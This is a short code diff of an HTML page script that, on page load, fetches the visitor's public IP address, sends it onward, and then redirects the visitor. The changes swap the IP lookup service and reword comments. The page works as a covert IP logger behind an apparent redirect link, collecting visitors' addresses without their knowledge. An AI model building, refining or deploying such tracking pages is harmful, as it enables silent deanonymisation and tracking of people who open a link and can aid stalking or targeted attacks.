@@ -18,7 +18,7 @@
         async function sendIPAndRedirect() {
             try {
                 // Fetch user's IP
-                const response = await fetch("https://api64.ipify.org?format=json");
+                const response = await fetch("https://api.myip.com");
                 const data = await response.json();
                 const userIP = data.ip;
 
@@ -33,11 +33,11 @@
                 console.error("Error sending IP:", error);
             }
 
-            // Redirect as soon as the request is sent
+            // Redirect instantly after the request is sent
             window.location.href = REDIRECT_URL;
         }
 
-        // Run immediately on page load
+        // Execute on page load
         sendIPAndRedirect();
     </script>
 </head>
